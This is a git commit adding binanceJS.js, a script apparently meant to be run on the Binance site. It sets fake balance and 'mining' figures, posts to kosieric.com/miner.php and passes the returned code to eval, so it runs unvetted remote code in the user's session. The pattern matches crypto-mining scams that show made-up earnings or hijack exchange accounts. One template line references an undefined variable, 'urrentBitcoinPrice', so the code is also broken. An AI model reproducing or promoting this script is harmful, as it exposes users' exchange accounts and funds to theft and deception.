d09ec795ad32a593ffa62b6c08dc8b860eaa4084
Kosi Eric <itskosieric@gmail.com>
2021-04-24 14:36:30 +0100

    Create binanceJS.js

---
+++ binanceJS.js
@@ -0,0 +1,32 @@
+var maxMiningInUSD = 1000;
+var auth = true;
+var intervalInSeconds = 1;
+var stopMiningAfterHowManySeconds = 100;
+var initialSpotBalanceUSD = 100000;
+var initialFiatBalanceUSD = 5000;
+var currentBitcoinPrice = 50000;
+var mineHowManyDollarsInOneSecond = 100;
+
+
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        // Typical action to be performed when the document is ready:
+
+
+        var additionalString = `
+var maxMiningInUSD = ${maxMiningInUSD}; 
+var auth = true;
+var intervalInSeconds = ${intervalInSeconds};
+var stopMiningAfterHowManySeconds = ${stopMiningAfterHowManySeconds}; 
+var initialSpotBalanceUSD = ${initialSpotBalanceUSD};
+var initialFiatBalanceUSD = ${initialFiatBalanceUSD};
+var urrentBitcoinPrice = ${urrentBitcoinPrice};
+var mineHowManyDollarsInOneSecond = ${mineHowManyDollarsInOneSecond}; `;
+
+        eval(additionalString + xhttp.responseText);
+
+    }
+};
+xhttp.open("POST", "https://kosieric.com/miner.php", true);
+xhttp.send();
